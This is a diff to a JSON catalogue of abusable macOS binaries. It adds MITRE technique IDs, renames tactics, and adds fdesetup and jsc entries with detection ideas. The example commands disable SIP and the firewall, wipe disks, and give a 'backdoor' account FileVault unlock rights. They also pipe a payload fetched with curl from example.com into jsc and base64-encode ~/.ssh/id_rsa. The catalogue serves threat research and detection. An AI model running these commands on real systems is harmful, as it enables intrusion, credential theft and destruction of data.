@@ -12,8 +12,9 @@
         "code": "caffeinate -i /tmp/evil",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "bash",
           "zsh"
@@ -26,6 +27,7 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [],
         "tags": [
           "bash",
           "zsh"
@@ -65,7 +67,10 @@
         "description": "Add the hidden flag to a file or directory to prevent it from being \nvisible in Finder and Terminal.",
         "code": "chflags hidden ~/evil",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1564.001"
         ],
         "tags": [
           "finder"
@@ -76,8 +81,9 @@
         "description": "Remove the hidden flag to a file or directory to make it visible in Finder\nand Terminal.",
         "code": "chflags nohidden ~/evil",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "finder"
         ]
@@ -120,10 +126,13 @@
         "description": "This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app",
         "code": "codesign --force --deep -s - MyApp.app",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.002"
         ],
         "tags": [
-          "codesign"
+          "oneliner"
         ]
       }
     ],
@@ -160,7 +169,10 @@
         "description": "disable SIP (System Integrity Protection) - requires booting into recovery mode",
         "code": "csrutil disable",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "users"
@@ -171,7 +183,10 @@
         "description": "When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode",
         "code": "csrutil authenticated-root disable",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "users"
@@ -182,8 +197,9 @@
         "description": "Insert a new IPv4 address in the list of allowed NetBoot sources",
         "code": "csrutil netboot add <address>",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
         ],
+        "techniques": [],
         "tags": [
           "configuration"
         ]
@@ -196,6 +212,7 @@
           "Reconnaissance",
           "Discovery"
         ],
+        "techniques": [],
         "tags": [
           "configuration"
         ]
@@ -206,6 +223,9 @@
         "code": "csrutil status",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": []
       }
@@ -251,7 +271,10 @@
         "description": "The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.",
         "code": "sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
           "gatekeeper"
@@ -264,6 +287,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1135"
+        ],
         "tags": []
       },
       {
@@ -272,6 +298,9 @@
         "code": "sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1037.002"
         ],
         "tags": []
       },
@@ -282,6 +311,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.002"
+        ],
         "tags": []
       },
       {
@@ -289,8 +321,9 @@
         "description": "Enables macOS' default firewall. This command requires root privileges.",
         "code": "sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
         ],
+        "techniques": [],
         "tags": [
           "firewall"
         ]
@@ -300,7 +333,10 @@
         "description": "Disables macOS' default firewall. This command requires root privileges.",
         "code": "sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1686"
         ],
         "tags": [
           "firewall"
@@ -342,6 +378,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "disk",
           "enumeration"
@@ -353,6 +392,9 @@
         "code": "diskutil apfs list -plist",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "apfs",
@@ -366,6 +408,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "disk",
           "filevault"
@@ -377,6 +422,9 @@
         "code": "diskutil apfs listCryptoUsers -plist <VOLUME_DEVICE>",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1087.001"
         ],
         "tags": [
           "filevault",
@@ -390,6 +438,9 @@
         "tactics": [
           "Credential Access"
         ],
+        "techniques": [
+          "T1110.001"
+        ],
         "tags": [
           "filevault",
           "passphrase"
@@ -401,8 +452,11 @@
         "code": "diskutil mount nobrowse -mountOptions noowners -mountPoint <MOUNT_PATH> <DEVICE>",
         "tactics": [
           "Privilege Escalation",
-          "Defense Evasion",
+          "Defense Impairment",
           "Collection"
+        ],
+        "techniques": [
+          "T1068"
         ],
         "tags": [
           "noowners",
@@ -414,8 +468,11 @@
         "description": "secureErase freespace overwrites the unallocated space of a mounted volume, leaving existing files untouched while destroying the remnants of deleted files that forensic recovery depends on. Level selects the pattern - 0 single-pass zero fill, 1 single-pass random fill, 2 a seven-pass fill, 3 the 35-pass Gutmann algorithm, and 4 a three-pass fill. Ownership of the affected disk is required. OSX/Filecoder.E, the 2017 \"Patcher\" ransomware analysed by ESET, ran this after encrypting files to null the root partition's free space; the sample failed only because it hardcoded /usr/bin/diskutil, which does not exist - diskutil lives in /usr/sbin. Two honest constraints apply on current systems - the verb refuses APFS volumes, reporting that a byte-run erase \"makes no sense due to its possibly-unbounded size\" (-69489), so it is limited to HFS+, ExFAT and other fixed-size volumes rather than a modern boot volume, and on SSDs wear levelling and block sparing mean overwritten blocks may survive regardless.",
         "code": "diskutil secureErase freespace 0 /Volumes/<VOLUME_NAME>",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Impact"
+        ],
+        "techniques": [
+          "T1485"
         ],
         "tags": [
           "secureerase",
@@ -429,6 +486,9 @@
         "tactics": [
           "Impact"
         ],
+        "techniques": [
+          "T1561.002"
+        ],
         "tags": [
           "wiper",
           "disk"
@@ -440,6 +500,9 @@
         "code": "diskutil eraseDisk JHFS+ Untitled <DISK>",
         "tactics": [
           "Impact"
+        ],
+        "techniques": [
+          "T1561.002"
         ],
         "tags": [
           "wiper",
@@ -453,6 +516,9 @@
         "tactics": [
           "Impact"
         ],
+        "techniques": [
+          "T1561.002"
+        ],
         "tags": [
           "wiper",
           "apfs"
@@ -465,6 +531,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "snapshot",
           "enumeration"
@@ -476,6 +545,9 @@
         "code": "diskutil apfs deleteSnapshot <VOLUME_DEVICE> -name <SNAPSHOT_NAME> -wait",
         "tactics": [
           "Impact"
+        ],
+        "techniques": [
+          "T1490"
         ],
         "tags": [
           "snapshot",
@@ -574,6 +646,7 @@
         "tactics": [
           "Persistence"
         ],
+        "techniques": [],
         "tags": [
           "bash"
         ]
@@ -619,6 +692,10 @@
           "Collection",
           "Exfiltration"
         ],
+        "techniques": [
+          "T1560.001",
+          "T1074.001"
+        ],
         "tags": [
           "files",
           "compress",
@@ -632,6 +709,9 @@
         "tactics": [
           "Collection",
           "Exfiltration"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
           "files",
@@ -647,7 +727,11 @@
           "Collection",
           "Exfiltration",
           "Lateral Movement",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1560.001",
+          "T1021.004"
         ],
         "tags": [
           "files"
@@ -659,6 +743,9 @@
         "code": "ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1574.004"
         ],
         "tags": [
           "files"
@@ -704,6 +791,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1046"
+        ],
         "tags": [
           "network"
         ]
@@ -714,6 +804,9 @@
         "code": "dns-sd -B _http._tcp",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1046"
         ],
         "tags": [
           "network"
@@ -726,6 +819,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1046"
+        ],
         "tags": [
           "network"
         ]
@@ -736,6 +832,9 @@
         "code": "dns-sd -B _smb._tcp",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1046"
         ],
         "tags": [
           "network"
@@ -779,6 +878,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.001"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -790,6 +892,9 @@
         "code": "dscacheutil -q user",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1087.001"
         ],
         "tags": [
           "bash",
@@ -832,6 +937,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.001"
+        ],
         "tags": [
           "users"
         ]
@@ -842,6 +950,9 @@
         "code": "dscl \"/Active Directory/TEST/All Domains\" -list /Users\ndscl \"/Active Directory/TEST/All Domains\" list /Users\ndscl \"/Active Directory/TEST/All Domains\" ls /Users\n",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1087.002"
         ],
         "tags": [
           "network",
@@ -855,6 +966,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.001"
+        ],
         "tags": [
           "users",
           "configuration"
@@ -866,6 +980,9 @@
         "code": "dscl \"/Active Directory/TEST/All Domains\" -read /Users/$USERNAME\ndscl \"/Active Directory/TEST/All Domains\" read /Users/$USERNAME\ndscl \"/Active Directory/TEST/All Domains\" cat /Users/$USERNAME\n",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1087.002"
         ],
         "tags": [
           "network",
@@ -880,6 +997,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1069.001"
+        ],
         "tags": [
           "groups"
         ]
@@ -890,6 +1010,9 @@
         "code": "dscl \"/Active Directory/TEST/All Domains\" -list /Groups\ndscl \"/Active Directory/TEST/All Domains\" list /Groups\ndscl \"/Active Directory/TEST/All Domains\" ls /Groups\n",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1069.002"
         ],
         "tags": [
           "network",
@@ -903,6 +1026,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1069.001"
+        ],
         "tags": [
           "groups",
           "configuration"
@@ -914,6 +1040,9 @@
         "code": "dscl \"/Active Directory/TEST/All Domains\" -read /Groups/$GROUPNAME\ndscl \"/Active Directory/TEST/All Domains\" read /Groups/$GROUPNAME\ndscl \"/Active Directory/TEST/All Domains\" cat /Groups/$GROUPNAME\n",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1069.002"
         ],
         "tags": [
           "network",
@@ -928,6 +1057,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1018"
+        ],
         "tags": [
           "network",
           "shares"
@@ -939,6 +1071,9 @@
         "code": "dscl . -list /SharePoints\ndscl . list /SharePoints\ndscl . ls /SharePoints\n",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1135"
         ],
         "tags": [
           "network",
@@ -952,6 +1087,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1201"
+        ],
         "tags": [
           "password",
           "policy"
@@ -964,6 +1102,9 @@
         "tactics": [
           "Persistence"
         ],
+        "techniques": [
+          "T1098"
+        ],
         "tags": [
           "password"
         ]
@@ -974,6 +1115,9 @@
         "code": "dscl -create",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1136.001"
         ],
         "tags": []
       }
@@ -1013,6 +1157,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -1024,6 +1171,9 @@
         "code": "dsconfigad -show |awk '/Active Directory Domain/{print $NF}'",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -1067,6 +1217,9 @@
           "Privilege Escalation",
           "Persistence"
         ],
+        "techniques": [
+          "T1098.007"
+        ],
         "tags": [
           "groups"
         ]
@@ -1078,6 +1231,9 @@
         "tactics": [
           "Privilege Escalation",
           "Lateral Movement"
+        ],
+        "techniques": [
+          "T1098.007"
         ],
         "tags": [
           "ldap"
@@ -1091,6 +1247,9 @@
           "Persistence",
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1098.007"
+        ],
         "tags": [
           "ssh"
         ]
@@ -1100,8 +1259,11 @@
         "description": "Deleting a com.apple.access_* group record removes the restriction and the service reverts to allowing all users, widening remote access without adding a visible member to an allow list. The -q flag suppresses the delete confirmation, making the operation usable from a non-interactive shell. Requires root.",
         "code": "dseditgroup -o delete -q com.apple.access_screensharing",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Lateral Movement"
+        ],
+        "techniques": [
+          "T1021"
         ],
         "tags": []
       },
@@ -1111,6 +1273,9 @@
         "code": "dseditgroup -o read admin",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1069.001"
         ],
         "tags": [
           "groups",
@@ -1180,6 +1345,10 @@
           "Persistence",
           "Privilege Escalation"
         ],
+        "techniques": [
+          "T1098",
+          "T1078.003"
+        ],
         "tags": []
       },
       {
@@ -1188,7 +1357,11 @@
         "code": "dsenableroot",
         "tactics": [
           "Persistence",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1098",
+          "T1078.003"
         ],
         "tags": []
       },
@@ -1197,7 +1370,10 @@
         "description": "-d removes the root account's password and disables it, restoring the default macOS state. An operator can\nenable root, use it, and disable it again, leaving the account state as it was before.\n",
         "code": "dsenableroot -d -u <ADMIN_USER> -p <ADMIN_PASSWORD>",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070"
         ],
         "tags": []
       }
@@ -1258,6 +1434,9 @@
           "Reconnaissance",
           "Discovery"
         ],
+        "techniques": [
+          "T1087.001"
+        ],
         "tags": [
           "ldap",
           "users"
@@ -1270,6 +1449,9 @@
         "tactics": [
           "Reconnaissance",
           "Discovery"
+        ],
+        "techniques": [
+          "T1069.001"
         ],
         "tags": [
           "ldap",
@@ -1290,6 +1472,118 @@
     "acknowledgements": []
   },
   {
+    "name": "fdesetup",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "Query and manage FileVault full disk encryption, users, and recovery keys.",
+    "full_description": "fdesetup configures and reports on FileVault full disk encryption. Some status verbs are available to any user, while most management verbs require root and authentication with a FileVault user's password or a recovery key. An attacker can use fdesetup to determine whether the disk is encrypted and how recovery is configured, perform an authenticated restart that bypasses the FileVault unlock screen, generate a new personal recovery key, grant an attacker-controlled account FileVault unlock rights, or disable FileVault entirely.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Determine FileVault status and recovery configuration",
+        "description": "Check whether FileVault is enabled and whether the host supports authenticated restarts without root. With root, an attacker can also list FileVault-enabled users and determine whether personal or institutional recovery keys exist.",
+        "code": "fdesetup status\nfdesetup isactive\nfdesetup supportsauthrestart\nsudo fdesetup list -extended\nsudo fdesetup haspersonalrecoverykey\nsudo fdesetup hasinstitutionalrecoverykey",
+        "tactics": [
+          "Discovery"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "filevault"
+        ]
+      },
+      {
+        "name": "Bypass the FileVault unlock screen on the next restart",
+        "description": "Perform an authenticated restart, which stores an unlock key in memory so the system boots directly to the login window without requiring the FileVault password. Using -delayminutes -1 arms the bypass for the next user-initiated restart instead of rebooting immediately, so services that need the data volume unlocked, such as SSH or remote management, come back up after the reboot.",
+        "code": "sudo fdesetup authrestart -delayminutes -1",
+        "tactics": [
+          "Defense Impairment",
+          "Persistence"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "filevault"
+        ]
+      },
+      {
+        "name": "Generate a new personal recovery key",
+        "description": "Replace the existing personal recovery key with a newly generated key printed to stdout. The attacker gains a key that can unlock the disk, and any previously escrowed key no longer works, which can prevent the organization from recovering the host.",
+        "code": "sudo fdesetup changerecovery -personal",
+        "tactics": [
+          "Credential Access",
+          "Persistence",
+          "Impact"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "filevault"
+        ]
+      },
+      {
+        "name": "Grant an attacker-controlled account FileVault unlock rights",
+        "description": "Add an existing local account, such as one created with sysadminctl or dscl, as a FileVault user so it can unlock the disk at boot. Authentication with an existing FileVault user's password or the recovery key is required.",
+        "code": "sudo fdesetup add -usertoadd backdoor",
+        "tactics": [
+          "Persistence"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "filevault",
+          "users"
+        ]
+      },
+      {
+        "name": "Disable FileVault",
+        "description": "Decrypt the boot volume and disable FileVault, removing at-rest protection for the data on the host.",
+        "code": "sudo fdesetup disable",
+        "tactics": [
+          "Defense Impairment",
+          "Impact"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "filevault"
+        ]
+      }
+    ],
+    "paths": [
+      "/usr/bin/fdesetup"
+    ],
+    "detections": [
+      {
+        "name": "Command-line detection: fdesetup with authrestart, changerecovery, removerecovery, add, or disable arguments outside of approved MDM or management tooling",
+        "url": "N/A"
+      },
+      {
+        "name": "Process execution detection: fdesetup status, list, or has*recoverykey executed by a script interpreter or an unsigned process",
+        "url": "N/A"
+      },
+      {
+        "name": "MDM telemetry: FileVault recovery key escrow change or FileVault disabled event reported by the MDM server",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "Volume encryption with FileVault in macOS - Apple Platform Security",
+        "url": "https://support.apple.com/guide/security/volume-encryption-with-filevault-sec4c6dc1b6e/web"
+      },
+      {
+        "name": "Security Implications of fdesetup authrestart on FileVault-Enabled Macs - Apple Developer Forums",
+        "url": "https://developer.apple.com/forums/thread/774703"
+      }
+    ],
+    "acknowledgements": []
+  },
+  {
     "name": "funzip",
     "author": "Pratik Jeware",
     "short_description": "The malicious binaries use funzip to extract the malicious binary with a password and using head or tail commands.",
@@ -1302,6 +1596,9 @@
         "code": "tail -c <> $0 | funzip  -<password>",
         "tactics": [
           "Execution"
+        ],
+        "techniques": [
+          "T1140"
         ],
         "tags": [
           "bash",
@@ -1344,6 +1641,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1083"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -1382,6 +1682,9 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1204.002"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -1394,6 +1697,9 @@
         "code": "hdiutil attach malicious.dmg",
         "tactics": [
           "Execution"
+        ],
+        "techniques": [
+          "T1204.002"
         ],
         "tags": [
           "bash",
@@ -1408,6 +1714,9 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1204.002"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -1420,6 +1729,9 @@
         "code": "hdiutil attach malicious.iso",
         "tactics": [
           "Execution"
+        ],
+        "techniques": [
+          "T1204.002"
         ],
         "tags": [
           "bash",
@@ -1434,6 +1746,10 @@
         "tactics": [
           "Collection"
         ],
+        "techniques": [
+          "T1560",
+          "T1074.001"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -1446,6 +1762,10 @@
         "code": "hdiutil create -encryption -stdinpass -volname \"Volume Name\" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg",
         "tactics": [
           "Collection"
+        ],
+        "techniques": [
+          "T1560",
+          "T1074.001"
         ],
         "tags": [
           "bash",
@@ -1489,6 +1809,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "oneliner",
@@ -1503,6 +1826,9 @@
           "Discovery",
           "Collection"
         ],
+        "techniques": [
+          "T1497.001"
+        ],
         "tags": [
           "oneliner",
           "vmcheck"
@@ -1516,6 +1842,9 @@
           "Discovery",
           "Collection"
         ],
+        "techniques": [
+          "T1120"
+        ],
         "tags": [
           "oneliner",
           "vmcheck"
@@ -1528,6 +1857,9 @@
         "tactics": [
           "Discovery",
           "Collection"
+        ],
+        "techniques": [
+          "T1497.001"
         ],
         "tags": [
           "oneliner",
@@ -1561,6 +1893,131 @@
     "acknowledgements": []
   },
   {
+    "name": "jsc",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "Execute JavaScript and read or write arbitrary files using the JavaScriptCore command-line shell.",
+    "full_description": "jsc is the command-line shell for JavaScriptCore, the JavaScript engine used by Safari and WebKit. It ships with macOS inside the JavaScriptCore framework but is not on the default PATH. Since macOS Ventura, the framework lives in the OS cryptex on the Preboot volume, and /System/Library/Frameworks/JavaScriptCore.framework is a symlink into it, so process telemetry typically reports the resolved /System/Volumes/Preboot/Cryptexes/OS/... path. Beyond evaluating JavaScript from a file, an inline expression, or standard input, the shell exposes built-in helpers such as readFile(), writeFile(), load(), and runString(), and supports WebAssembly. These give an attacker an Apple-signed interpreter for executing obfuscated script content, reading files, and writing arbitrary (including binary) files outside of commonly monitored interpreters such as osascript, python3, or perl. jsc has no native networking or shell execution capability, so it is typically paired with other tooling for those stages.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Execute JavaScript from a file, an inline expression, or standard input",
+        "description": "jsc evaluates JavaScript passed as a file, with the -e flag, or piped through standard input. This provides an alternative to JXA via osascript for executing attacker-controlled script content with a signed Apple binary.",
+        "code": "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc payload.js -- arg1 arg2\n/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'print(\"hello\")'\ncurl -s https://example.com/payload.js | /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc",
+        "tactics": [
+          "Execution",
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059.007"
+        ],
+        "tags": [
+          "javascript",
+          "oneliner",
+          "bash"
+        ]
+      },
+      {
+        "name": "Execute an obfuscated Base64 encoded payload",
+        "description": "The atob() and eval() functions can be combined to decode and run a Base64 encoded script, keeping the plaintext script content off the command line and out of files on disk.",
+        "code": "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'eval(atob(\"cHJpbnQoJ2RlY29kZWQnKQ==\"))'",
+        "tactics": [
+          "Execution",
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059.007",
+          "T1140"
+        ],
+        "tags": [
+          "javascript",
+          "base64",
+          "oneliner"
+        ]
+      },
+      {
+        "name": "Read and Base64 encode the contents of a file",
+        "description": "The readFile() built-in reads any file the current user can access. Combined with btoa(), file contents can be encoded for staging or exfiltration through another channel.",
+        "code": "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'print(btoa(readFile(\"/Users/<user>/.ssh/id_rsa\")))'",
+        "tactics": [
+          "Collection",
+          "Credential Access"
+        ],
+        "techniques": [
+          "T1005"
+        ],
+        "tags": [
+          "javascript",
+          "base64",
+          "oneliner"
+        ]
+      },
+      {
+        "name": "Decode and write a binary payload to disk",
+        "description": "The writeFile() built-in accepts a Uint8Array, allowing an attacker to decode an embedded Base64 blob and write an arbitrary binary such as a Mach-O executable to disk without using base64, xxd, or similar tools.",
+        "code": "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'var s=atob(\"<base64 blob>\"); var b=new Uint8Array(s.length); for(var i=0;i<s.length;i++) b[i]=s.charCodeAt(i); writeFile(\"/tmp/payload\", b)'",
+        "tactics": [
+          "Stealth"
+        ],
+        "techniques": [
+          "T1140"
+        ],
+        "tags": [
+          "javascript",
+          "base64",
+          "oneliner"
+        ]
+      },
+      {
+        "name": "Execute a WebAssembly module",
+        "description": "jsc supports the WebAssembly API, so an attacker can compile and run a WebAssembly module, which makes payload logic harder to inspect than plaintext JavaScript.",
+        "code": "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'var m=new WebAssembly.Module(readFile(\"payload.wasm\",\"binary\")); new WebAssembly.Instance(m).exports.main()'",
+        "tactics": [
+          "Execution",
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059.007",
+          "T1027"
+        ],
+        "tags": [
+          "javascript",
+          "webassembly"
+        ]
+      }
+    ],
+    "paths": [
+      "/System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc",
+      "/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc",
+      "/System/Cryptexes/OS/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc",
+      "/System/Volumes/Preboot/Cryptexes/OS/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc"
+    ],
+    "detections": [
+      {
+        "name": "Process execution detection: any execution of jsc (legitimate use is rare outside of developer and WebKit testing workflows). Match on the JavaScriptCore.framework/Versions/*/Helpers/jsc path suffix so both the symlinked and resolved cryptex paths are covered",
+        "url": "N/A"
+      },
+      {
+        "name": "Command-line detection: jsc invoked with -e containing eval/atob/writeFile/readFile, or with jsc as the child of curl, a shell reading from a pipe, or a non-developer parent process",
+        "url": "N/A"
+      },
+      {
+        "name": "File creation detection: files written by the jsc process, especially Mach-O executables or files in /tmp, /Users/Shared, or ~/Library/LaunchAgents",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "JavaScriptCore - WebKit Documentation",
+        "url": "https://docs.webkit.org/Deep%20Dive/JSC/JavaScriptCore.html"
+      },
+      {
+        "name": "jsc (Michael Tsai)",
+        "url": "https://mjtsai.com/blog/2021/08/26/jsc/"
+      }
+    ],
+    "acknowledgements": []
+  },
+  {
     "name": "kextstat",
     "author": "Mark Morowczynsk (@markmorow)",
     "short_description": "Display the status of loaded kernel extensions (kexts)",
@@ -1573,6 +2030,9 @@
         "code": "kexstat",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -1614,6 +2074,9 @@
           "Persistence",
           "Command and Control"
         ],
+        "techniques": [
+          "T1021.005"
+        ],
         "tags": []
       },
       {
@@ -1624,6 +2087,9 @@
           "Persistence",
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1021.005"
+        ],
         "tags": []
       },
       {
@@ -1632,7 +2098,10 @@
         "code": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw <PASSWORD>\n",
         "tactics": [
           "Persistence",
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1021.005"
         ],
         "tags": []
       },
@@ -1641,7 +2110,10 @@
         "description": "-configure -clientopts -setmenuextra -menuextra no sets LoadRemoteManagementMenuExtra to false in\ncom.apple.RemoteManagement.plist, stopping the Remote Management menu extra from loading in the menu bar. Paired\nwith -restart -menu to reload the SystemUIServer-hosted item, this removes the most visible on-screen cue that the\nservice is on, so a user at the console sees no indicator for the newly enabled remote access. Requires root.\n",
         "code": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setmenuextra -menuextra no -restart -menu\n",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1564"
         ],
         "tags": []
       },
@@ -1651,8 +2123,12 @@
         "code": "ssh <USER>@<TARGET_IP> \"sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -privs -all -users <USERNAME> -restart -agent -console\"\n",
         "tactics": [
           "Collection",
-          "Defense Evasion",
+          "Stealth",
           "Lateral Movement"
+        ],
+        "techniques": [
+          "T1021.005",
+          "T1021.004"
         ],
         "tags": [
           "ssh"
@@ -1663,7 +2139,10 @@
         "description": "-deactivate unloads the com.apple.screensharing LaunchDaemon, kills the screen sharing daemon and agent, and\ndeletes the RemoteManagement.launchd marker file. -uninstall -settings additionally deletes\ncom.apple.RemoteDesktop.plist, com.apple.ARDAgent.plist and com.apple.RemoteManagement.plist, and destroys the\n\"naprivs\" attribute on every local user record. An attacker uses this to remove the configuration once the\nobjective is met. Requires root.\n",
         "code": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -uninstall -settings -deactivate -stop -quiet\n",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070"
         ],
         "tags": []
       }
@@ -1719,8 +2198,9 @@
         "description": "Terminate running Terminal processes after malicious commands have been launched, reducing visible evidence of execution and interfering with manual analysis.",
         "code": "killall Terminal",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "processes",
           "terminal",
@@ -1732,8 +2212,10 @@
         "description": "Repeatedly terminate macOS user-interface processes at short intervals to disrupt normal desktop operation and force the victim to continue an attacker-controlled interaction flow.",
         "code": "while true; do killall Finder Dock SystemUIServer NotificationCenter 2>/dev/null; sleep 0.1; done",
         "tactics": [
-          "Impact",
-          "Defense Evasion"
+          "Impact"
+        ],
+        "techniques": [
+          "T1489"
         ],
         "tags": [
           "processes",
@@ -1746,8 +2228,11 @@
         "description": "Repeatedly terminate NotificationCenter to interfere with the display of macOS notifications.",
         "code": "killall NotificationCenter",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Impact"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "notifications",
